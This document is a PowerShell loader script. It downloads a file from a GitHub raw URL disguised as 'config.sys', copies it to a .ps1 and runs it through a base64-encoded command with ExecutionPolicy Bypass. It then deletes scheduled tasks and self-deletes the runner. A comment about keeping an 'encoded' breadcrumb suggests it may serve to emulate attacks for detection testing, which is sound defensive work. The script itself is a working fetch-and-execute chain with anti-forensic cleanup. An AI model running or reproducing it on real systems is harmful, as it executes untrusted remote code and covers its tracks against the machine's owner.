# UID = 152612134
$ErrorActionPreference = 'Stop'
$ProgressPreference    = 'SilentlyContinue'

Start-Sleep -Seconds 3

$dropUrl  = "https://raw.githubusercontent.com/flocktrack/sysdiag-utils/main/config.sys"
$destPath = "C:\ProgramData\sysdiag\config.sys"
$execPath = "C:\ProgramData\sysdiag\config.ps1"

$folder = Split-Path $destPath
if (-not (Test-Path -LiteralPath $folder)) {
    New-Item -Path $folder -ItemType Directory | Out-Null
}

Invoke-WebRequest -Uri $dropUrl -OutFile $destPath
Copy-Item -LiteralPath $destPath -Destination $execPath -Force

# Execute agent via encoded command (keeps the “encoded” breadcrumb)
$cmd = "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File `"$execPath`""
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand $encodedCommand

Start-Job {
    Start-Sleep -Seconds 5
    schtasks /delete /tn "SysDiagUtils-S1" /f 2>$null
    schtasks /delete /tn "SysDiagUtils-S2" /f 2>$null
    schtasks /delete /tn "SysDiagUtils-S3" /f 2>$null
    schtasks /delete /tn "SysDiagUtils"    /f 2>$null
} | Out-Null

# Self-delete the runner
Start-Job { Start-Sleep -Seconds 2; Remove-Item -LiteralPath 'C:\Temp\runner.ps1' -Force -ErrorAction SilentlyContinue } | Out-Null
